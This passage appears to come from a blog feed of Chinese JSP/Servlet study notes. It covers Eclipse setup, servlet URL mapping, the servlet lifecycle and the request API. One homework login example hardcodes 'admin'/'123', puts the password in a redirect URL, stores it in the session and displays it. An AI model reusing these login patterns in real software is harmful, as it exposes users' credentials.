loading="lazy"></p><p>下载后，接下，记住解压后的文件的目录绝对路径，然后我们打开Eclipse这个IDE工具，依次选择Help-&gt;Install New Software-&gt;Add…-&gt;Local…；然后添加那个解压的文件的文件夹，然后确定后，进行等待，然后展开下图中的一个语言包：</p><p><img src="/assets/images/jsp-pb-7.jpg" alt="Install Language Pack" loading="lazy"></p><p>此处切记哈，不要安装这个语言包中的所有插件，因为有一些汉化的极其不好，并且你全部安装后会发现Eclipse的有些功能莫名地无法使用，就是因为有一些语言包插件有问题，为了能最大的汉化并不影响我们的日常使用，我推荐选择其中一款名字接近于”for eclipse…”的插件，目前该插件汉化Eclipse的汉化率在80%以上，其他的操作一次进行即可。</p><hr><blockquote><p>###Eclipse中导入其他的工程时出错，无法运行</p></blockquote><p>当我们从别人的机器中拷贝出一个工程项目并在我们的电脑中导入该工程后，很容易出现的问题就是出错，无法运行，这其中有很大的原因在于工程项目的构建路径中的JAR和类文件夹出错。</p><p>我们知道，每个工程的构建依赖于电脑自身的Java与Tomcat环境，如果一个人的电脑配置的环境是Java1.7，并且它的Tomcat环境是7.0.73,他新建一个工程的时候Eclipse自然在构建路径中配置这些信息，但是由于我的系统环境为Java1.8,Tomcat8.5.8，这样就会因为找不到对应的配置环境而出错，还有一种可能性是，你环境的安装路径不对，这里仅是推测。出错可能如下图所示：</p><p><img src="/assets/images/jsp-pb-8.jpg" alt="Path Error" loading="lazy"></p><p>然后我们的纠错步骤为，修改该工程的构建路径中的的JAR和类文件夹信息，删除出错的，添加我们本机的Java环境以及Tomcat环境，如下图所示：</p><p><img src="/assets/images/jsp-pb-9.jpg" alt="Library Error" loading="lazy"><br><img src="/assets/images/jsp-pb-10.jpg" alt="Runtime Error" loading="lazy"></p><p>这样的话，该工程的错误就回消失，当然还有一点是可能是该工程的原始环境较现在的环境较新，因此出错，这样的话就具体针对错误提示就行排除。</p>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Servlet完成表单提交验证-JSP作业-2</title>
      <link href="/2016/11/30/jsp-homework-2/"/>
      <url>/2016/11/30/jsp-homework-2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、作业内容："><a href="#二、作业内容：" class="headerlink" title="二、作业内容："></a>二、作业内容：</h2><p>利用三个servlet，实现表单页面的输出，表单提交的信息的验证以及验证信息后的跳转页面。</p><h2 id="三、开始"><a href="#三、开始" class="headerlink" title="三、开始"></a>三、开始</h2><p>我们一共需要建立三个servlet类，他们分别是：Login.java，LoginContral.java和Welcome.java，他们的具体代码如下所示：</p><blockquote><p>1.Login()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Login&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@see</span> HttpServlet#HttpServlet()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>    &#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">//super.doGet(req, resp);</span><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 解决页面显示的中文乱码问题</span><br>resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br><span class="hljs-comment">//解决中文在传输过程中的乱码问题</span><br>req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>out.println(<span class="hljs-string">&quot;&lt;html&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;head&gt;&lt;title&gt;登陆页面&lt;/title&gt;&lt;/head&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;body&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;h1&gt;登陆页面&lt;/h1&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;form action=&#x27;LoginControl&#x27;&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;用户名：&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27; /&gt;&lt;br&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;密码：&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27; /&gt;&lt;br&gt;&quot;</span>);<br><span class="hljs-comment">// 添加隐藏input元素（这种类型元素在页面上不显示，但是可以传递到其他的页面）</span><br>out.println(<span class="hljs-string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;sex&#x27; value=&#x27;man&#x27; /&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;登陆&#x27;&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/form&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/body&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>2.LoginControl()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/LoginControl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginControl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@see</span> HttpServlet#HttpServlet()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LoginControl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>    &#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">// super.doGet(req, resp);</span><br><span class="hljs-comment">// 获取请求的信息（方法的参数需要与input元素中name属性值相同，否则取不到值）</span><br><span class="hljs-comment">// 解决页面显示的中文乱码问题</span><br>resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br><span class="hljs-comment">//解决中文在传输过程中的乱码问题</span><br>req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;sex&quot;</span>);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; password.equals(<span class="hljs-string">&quot;123&quot;</span>)) &#123;<span class="hljs-comment">// 合法</span><br><span class="hljs-comment">// 页面的跳转（注意：这个方法的参数是url-pattern里面配置的）</span><br><span class="hljs-comment">// 当用户合法后，把用户名和密码写到cookie，供welcome页面取出并显示</span><br><span class="hljs-comment">// a.用cookie实现不同页面之间数据的共享</span><br><span class="hljs-comment">// 1.创建cookie</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Cookie c1 = new Cookie(&quot;username&quot;,username); Cookie c2 = new</span><br><span class="hljs-comment"> * Cookie(&quot;password&quot;,password);</span><br><span class="hljs-comment"> * //设定cookie在客户端存在的时间,单位为s（如果没有设定的话，当关闭浏览器时，cookie消失或者过期）</span><br><span class="hljs-comment"> * c1.setMaxAge(10); c2.setMaxAge(10); //2.向客户端写cookie</span><br><span class="hljs-comment"> * response.addCookie(c1); response.addCookie(c2);</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// c.利用session阻止用户的非法登录</span><br><span class="hljs-comment">// 如果用户名合法，则把用户名放到session里面</span><br><span class="hljs-type">HttpSession</span> <span class="hljs-variable">hs</span> <span class="hljs-operator">=</span> req.getSession();<br><span class="hljs-comment">// 设置session的生命时间（单位s）</span><br>hs.setMaxInactiveInterval(<span class="hljs-number">30</span>);<br><span class="hljs-comment">// 向session中放置属性</span><br>hs.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, username);<br>hs.setAttribute(<span class="hljs-string">&quot;password&quot;</span>, password);<br><span class="hljs-comment">// b.通过sendRedirect实现不同页面之间数据的共享</span><br>resp.sendRedirect(<span class="hljs-string">&quot;Welcome?username=&quot;</span> + username + <span class="hljs-string">&quot;&amp;password=&quot;</span> + password + <span class="hljs-string">&quot;&amp;sex=&quot;</span> + sex);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 不合法</span><br><span class="hljs-comment">// 这个方法的参数是url-pattern里面配置的</span><br>resp.sendRedirect(<span class="hljs-string">&quot;Login&quot;</span>);<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>3.LoginControl()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Welcome&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Welcome</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@see</span> HttpServlet#HttpServlet()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Welcome</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>    &#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">// super.doGet(req, resp);</span><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 解决页面显示的中文乱码问题</span><br>resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br><span class="hljs-comment">//解决中文在传输过程中的乱码问题</span><br>req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br><span class="hljs-comment">// a.通过cookie来获取共享信息；</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * //3.获取cookie Cookie[] cs=request.getCookies();</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * if(cs!=null)&#123; for(int i=0;i&lt;cs.length;i++)&#123; Cookie temp = cs[i];</span><br><span class="hljs-comment"> * out.println(temp.getName()+&quot;:&quot;+temp.getValue()); &#125; &#125;else&#123;</span><br><span class="hljs-comment"> * out.println(&quot;cookie不存在或者已过期！&quot;); &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// b.通过sendRedirect来获取共享信息</span><br><span class="hljs-comment">// String username = request.getParameter(&quot;username&quot;);</span><br><span class="hljs-comment">// String password = request.getParameter(&quot;password&quot;);</span><br><span class="hljs-comment">// String sex = request.getParameter(&quot;sex&quot;);</span><br><span class="hljs-comment">// out.println(&quot;username==&quot;+username+&quot; password==&quot;+password+&quot;</span><br><span class="hljs-comment">// sex==&quot;+sex);</span><br><span class="hljs-comment">// c.通过session 阻止非法用户登录网站内部</span><br><span class="hljs-comment">// 获取session</span><br><span class="hljs-type">HttpSession</span> <span class="hljs-variable">hs</span> <span class="hljs-operator">=</span> req.getSession();<br><span class="hljs-comment">// 根据session中的属性名获取相应的属性值</span><br><span class="hljs-type">String</span> <span class="hljs-variable">usernameSession</span> <span class="hljs-operator">=</span> (String) hs.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">passwordSession</span> <span class="hljs-operator">=</span> (String) hs.getAttribute(<span class="hljs-string">&quot;password&quot;</span>);<br><span class="hljs-keyword">if</span> (usernameSession != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// 如果从session当中能够获取用户名，则可以进入我的网站</span><br>out.println(<span class="hljs-string">&quot;欢迎登陆我们的网站！用户名：&quot;</span> + usernameSession + <span class="hljs-string">&quot; 密码：&quot;</span>+ passwordSession);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 否则显示空白页面</span><br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初次使用Servlet-JSP笔记-1</title>
      <link href="/2016/11/29/jsp-1/"/>
      <url>/2016/11/29/jsp-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers. Version: Mars.1 Release (4.5.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、课堂学习目标"><a href="#二、课堂学习目标" class="headerlink" title="二、课堂学习目标"></a>二、课堂学习目标</h2><p>了解servlet的虚拟路径使用方法，这里具体讲解使用Eclipse的servlet3.0之前的版本(使用servlet2.5版本)中关于WebContent&#x2F;WEB-INF&#x2F;web.xml的使用方法以及servlet3.0及之后的版本的虚拟路径使用方法。</p><h2 id="三、开始"><a href="#三、开始" class="headerlink" title="三、开始"></a>三、开始</h2><h3 id="3-1、测试一：利用servlet3-0之前的版本进行测试"><a href="#3-1、测试一：利用servlet3-0之前的版本进行测试" class="headerlink" title="3.1、测试一：利用servlet3.0之前的版本进行测试"></a>3.1、测试一：利用servlet3.0之前的版本进行测试</h3><p>利用Eclipse新建一个Dynamin Web Project,调用安装的Apache Tomcat V8.0版本，然后选择2.5的servlet版本，该IDE会自动新建一个WebContent&#x2F;WEB-INF&#x2F;web.xml文件。</p><p><img src="/assets/images/jsp-1-1.jpg" alt="New Dynamic Web Project" loading="lazy"></p><p>之后我们新建两个servlet，一个直接全部使用默认设置，另一个我们点击下一步后不使用默认自带的doPost()和doGet()方法。</p><p><img src="/assets/images/jsp-1-2.jpg" alt="Create Servlet" loading="lazy"></p><p>新建一个index.jsp文件后，软件视图如图所示：</p><p><img src="/assets/images/jsp-1-3.jpg" alt="index.jsp" loading="lazy"></p><p>因为本次我们需要利用servlet配置虚拟路径，所以我们直接利用未初始化重写方法doPost()和doGet()的Servlet_2.java进行操作，在Servlet_2.java中的Servlet_2类中空白处点击右键，选择”源码”,然后选择”覆盖&#x2F;实现方法”中选择对应的doGet()，然后我们进行重写操作，输出一行数据。</p><p><img src="/assets/images/jsp-1-4.jpg" alt="Servlet2.java" loading="lazy"></p><p>然后我们就需要修改web.xml文件进行虚拟路径的部署，这里由于我们提到了web.xml文件，所以，我们需要介绍一下什么是web.xml文件。</p><h4 id="题外话：什么是web-xml文件？"><a href="#题外话：什么是web-xml文件？" class="headerlink" title="题外话：什么是web.xml文件？"></a>题外话：什么是web.xml文件？</h4><p>web.xml文件可以简单的理解成servlet的一个配置文件,通过这个配置文件来寻找对应的servlet处理业务。配置web.xml的目的就是让容器知道你的请求是由那个servlet处理，然后把httprequest和httpresponse对象注入到该servlet中。一个web.xml中当然可以存在多个servlet规则，具体的使用方法下面将进行介绍。</p><p>需要注意的是，所有部署描述符文件的顶层（根）元素为web-app。而XML元素不像HTML，他们是大小写敏感的。因此，web-App和WEB-APP都是不合法的，web-app必须用小写。 </p><h4 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h4><p>web.xml中配置映射servlet的规则十分简单，如下列代码所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet&gt;<br>    &lt;servlet-name&gt;Servlet_2&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.bugwz.servlet.Servlet_2&lt;/servlet-class&gt;<br>  &lt;/servlet&gt;<br>  &lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;Servlet_2&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/Servlet_2&lt;/url-pattern&gt;<br>  &lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><p>如果你使用的servlet的版本是3.0之前的版本，如果你想要成功映射的话，你必须将这些代码(上面的代码是必须的，最简化)正确的在web.xml文件的web-app标签中书写，上述代码具体讲解如下：</p><ol><li>servlet标签</li></ol><ul><li>servlet-name标签内的信息对应servlet-mapping标签内的servlet-name的标签内的信息，推荐其内的信息与servlet的类名相同。</li><li>servlet-class标签内的信息为映射对象的信息，具体格式为”servlet所属包名.servlet的类名”，这样才能找到具体的类，并执行。</li></ul><ol start="2"><li>servlet-mapping标签</li></ol><ul><li>servlet-name标签内的信息内容上面已经说了。</li><li>url-pattern标签内的信息为该项目下的虚拟路径，也就是说项目下的&#x2F;Servlet_2就会展示类Servlet_2中的信息，这里的虚拟路径可以根据需求修改。实践可知，url-pattern中信息若为&#x2F;*，则该项目的所有子栏目，全部指向该处对应的类，是否可以通过某种方式存放正则表达式待考证。</li></ul><ol start="3"><li>执行过程为，根据servlet-mapping标签的子标签url-pattern的虚拟路径，按照servlet-mapping标签内的子标签servlet-name的信息，去寻找servlet标签中的子标签servlet-name中相同的信息，然后展示对应的servlet-class标签中的类中的可展示内容。</li></ol><h3 id="3-2、测试二：利用servlet3-0及其之后的版本进行测试"><a href="#3-2、测试二：利用servlet3-0及其之后的版本进行测试" class="headerlink" title="3.2、测试二：利用servlet3.0及其之后的版本进行测试"></a>3.2、测试二：利用servlet3.0及其之后的版本进行测试</h3><p>这里需要说明的是如果你的项目目前使用的是servlet3.0及之后的版本，那么你的项目中不会直接创建web.xml，servlet3.0 及之后的版本中新增的注解支持简化了 Servlet&#x2F; 过滤器 &#x2F; 监听器的声明，从而使得 web.xml 变为可选配置。这里我们使用servlet3.1版本，目前最新的版本。</p><p><img src="/assets/images/jsp-1-5.jpg" alt="New Dynamic Web Project - Version" loading="lazy"></p><p>我们依次新建两个<code>Servlet_1.java</code>和<code>Servlet_2.java</code>，然后我们会发现在新建的servlet中带了下面这一行代码，如下图所示：</p><p><code>@WebServlet(&quot;/Servlet_2&quot;)</code></p><p><img src="/assets/images/jsp-1-6.jpg" alt="Servlet_2" loading="lazy"></p><p>上面那一行代码其实就充当了web.xml中的定义的虚拟路径的那几行代码的功能，因此servlet3.0及之后的版本简化了代码的书写量，更加简单易用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解Servlet的init()、service()与destroy()-JSP笔记-2</title>
      <link href="/2016/11/29/jsp-2/"/>
      <url>/2016/11/29/jsp-2/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Eclipse Java EE IDE for Web Developers. Version: Mars.1 Release (4.5.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h1 id="课堂学习目标"><a href="#课堂学习目标" class="headerlink" title="课堂学习目标"></a>课堂学习目标</h1><p>实践servlet的init()、service()与destroy()方法，理解servlet生命周期的三个阶段。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>我们还是新建一个名为Test的新工程，然后新建一个不带doGet()与doPost()方法的一个基本的servlet，然后我们依次循规蹈矩的手动覆盖重写三个方法，他们分别是init()、service()和destroy()方法，重写后截图如下：</p><p><img src="/assets/images/jsp-2-1.jpg" alt="Servlet_1" loading="lazy"></p><p>我们在浏览器地址栏中输入进入Servlet_1的虚拟路径后，控制台下便出现了，调用init()方法的输出信息，然后调用了service()方法的输出信息，这两个方法的调用就是servlet的前两个生命周期，初始化阶段，调用init()方法；响应客户请求阶段，调用service()方法，之后每次刷新浏览器界面会发现只出现调用service()方法的输出结果，如下所示：</p><p><img src="/assets/images/jsp-2-2.jpg" alt="service()输出结果" loading="lazy"></p><blockquote><p>提示：</p></blockquote><p>如果你发现你打不开映射的虚拟路径，浏览器并提示了404错误，请尝试移步<a href="http://www.bugwz.com/jsp1/#jsp_1_trouble">这里</a> ，尝试解决问题。</p><p>之后，当我们停止服务器的时候，注意，这不是终止进程，还是有点区别的。</p><ol><li>停止服务器：web应用被终止，或Servlet容器终止运行，或Servlet容器重新装载Servlet新实例时，Servlet容器会先调用Servlet的destroy()方法，在destroy()方法中可以释放掉Servlet所占用的资源。</li><li>终止进程：servlet容器被强行终止，来不及调用Servlet的destroy()方法。</li></ol><p>我们点击停止服务器后效果图如下所示：</p><p><img src="/assets/images/jsp-2-3.jpg" alt="Stop Server" loading="lazy"></p><h1 id="来些总结"><a href="#来些总结" class="headerlink" title="来些总结"></a>来些总结</h1><p>Servlet生命周期分为三个阶段：</p><ol><li>初始化阶段，调用init()方法</li><li>响应客户请求阶段，调用service()方法</li><li>终止阶段，调用destroy()方法</li></ol><p>Servlet初始化阶段：(在下列时刻Servlet容器装载Servlet)</p><ol><li>Servlet容器启动时自动装载某些Servlet。</li><li>在Servlet容器启动后，客户首次向Servlet发送请求。</li><li>Servlet类文件被更新后，重新装载Servlet。</li></ol><blockquote><p>Servlet被装载后，Servlet容器创建一个Servlet实例并且调用Servlet的init()方法进行初始化。在Servlet的整个生命周期内，init()方法只被调用一次。</p></blockquote><p>Servlet响应请求阶段：</p><p>　　对于用户到达Servlet的请求，Servlet容器会创建特定于这个请求的ServletRequest对象和ServletResponse对象，然后调用Servlet的service方法。service方法从ServletRequest对象获得客户请求信息，处理该请求，并通过ServletResponse对象向客户返回响应信息。</p><p>Servlet终止阶段：</p><p>　　当web应用被终止，或Servlet容器终止运行，或Servlet容器重新装载Servlet新实例时，Servlet容器会先调用Servlet的destroy()方法，在destroy()方法中可以释放掉Servlet所占用的资源。</p><blockquote><p>关于Servlet生命周期与工作原理的更详细的信息，推荐访问<a href="http://www.cnblogs.com/cuiliang/archive/2011/10/21/2220671.html">这里</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet API-JSP笔记-3</title>
      <link href="/2016/11/29/jsp-3/"/>
      <url>/2016/11/29/jsp-3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、总结知识点"><a href="#二、总结知识点" class="headerlink" title="二、总结知识点"></a>二、总结知识点</h2><h3 id="2-1、认识Servlet-API"><a href="#2-1、认识Servlet-API" class="headerlink" title="2.1、认识Servlet API:"></a>2.1、认识Servlet API:</h3><p>Servlet API 由两个软件包组成：Javax.servlet 包和 Javax.servlet.http 包。其中 Javax.servlet 包主要存放与 http 协议无关的一般性的 servlet 类， Javax.servlet.http 包主要存放与 http 协议相关的功能的类。(两个软件包都位于Tomcat的 servlet-api.jar 中)</p><h3 id="2-2、本次主要说明的东西如下："><a href="#2-2、本次主要说明的东西如下：" class="headerlink" title="2.2、本次主要说明的东西如下："></a>2.2、本次主要说明的东西如下：</h3><ul><li>Javax.servlet.http包中的接口：<ul><li>HttpServletRequest接口：提供http请求信息。</li><li>HttpServletResponse接口：提供http响应。</li></ul></li><li>Javax.servlet包中的接口：<ul><li>ServletConfig接口：在初始化的过程中由Servlet容器使用。</li><li>ServletContext接口：定义Servlet用于获取来自其容器的信息的方法。</li><li>ServletRequest接口：向服务器提交请求。</li><li>ServletResponse接口：响应客户端请求。</li></ul></li><li>Javax.servlet包中的类：<ul><li>ServletInputStream类：用于从客户端读取二进制数据。</li><li>ServletOutputStream类：用于将二进制数据发送到客户端。</li><li>ServletException类：用于异常处理的类。</li><li>UnavailableException类：当servlet或filter不能用时，处理异常的类。</li></ul></li></ul><h3 id="2-3、HttpServletRequest接口"><a href="#2-3、HttpServletRequest接口" class="headerlink" title="2.3、HttpServletRequest接口"></a>2.3、HttpServletRequest接口</h3><p>HttpServletRequest接口对应客户端http的请求。当客户端通过http访问服务器时，http请求中的所有信息都封装在HttpServletRequest对象中，我们可以通过该对象一些方法获取很多信息，其中获取客户机信息，获取请求头信息，获取请求参数等，这主要说明这三种。</p><h4 id="2-3-1、获取客户机信息："><a href="#2-3-1、获取客户机信息：" class="headerlink" title="2.3.1、获取客户机信息："></a>2.3.1、获取客户机信息：</h4><ul><li>getRequestURL方法返回客户端发出完整请求的URL</li><li>getRequestURI方法返回请求行中的资源名部分</li><li>getQueryString方法返回请求行中的参数部分</li><li>getRemoteAddr方法返回发出请求的客户机的IP地址</li><li>getMethod得到客户机请求方式</li><li>getContextPath获得工程虚拟目录名称</li></ul><p>部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URI 和 URL 区别？ </span><br><span class="hljs-comment">//URI获得以webroot目录开始路径 URL获得以Http协议开始完整路径</span><br><span class="hljs-comment">//URI 描述路径范围比URL大（URL都是URI ） /lesson9_jsp/request1  ../request1 这些路径都是URI，不是URL</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestServletDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>System.out.println(request.getRequestURI()); <br><span class="hljs-comment">// 输出：/lesson9_jsp/RequestServletDemo1</span><br>System.out.println(request.getRequestURL());<br><span class="hljs-comment">// 输出为：http://localhost:8080/lesson9_jsp/RequestServletDemo1</span><br>System.out.println(request.getQueryString());<br><span class="hljs-comment">// 输出：null</span><br>System.out.println(<span class="hljs-string">&quot;您的ip是：&quot;</span> + request.getRemoteAddr());<br><span class="hljs-comment">// 输出：您的ip是：0:0:0:0:0:0:0:1</span><br>System.out.println(<span class="hljs-string">&quot;您的请求方式是： &quot;</span> + request.getMethod());<br><span class="hljs-comment">// 输出：您的请求方式是： GET</span><br>System.out.println(<span class="hljs-string">&quot;工程虚拟目录:&quot;</span> + request.getContextPath());<br><span class="hljs-comment">// 输出：工程虚拟目录:/lesson9_jsp</span><br>System.out.println(<span class="hljs-string">&quot;当前资源:&quot;</span> + request.getServletPath());<br><span class="hljs-comment">// 输出：当前资源:/RequestServletDemo1</span><br>System.out.println(<span class="hljs-string">&quot;uri is:&quot;</span>+request.getRequestURI());<br><span class="hljs-comment">// 输出：uri is:/lesson9_jsp/RequestServletDemo1</span><br>System.out.println(<span class="hljs-string">&quot;当前资源: &quot;</span>+ request.getRequestURI().substring(request.getContextPath().length()));<br><span class="hljs-comment">// 输出：当前资源: /RequestServletDemo1</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-2、获取请求头信息："><a href="#2-3-2、获取请求头信息：" class="headerlink" title="2.3.2、获取请求头信息："></a>2.3.2、获取请求头信息：</h4><ul><li>getHeader(name)—String</li><li>getHeaders(String 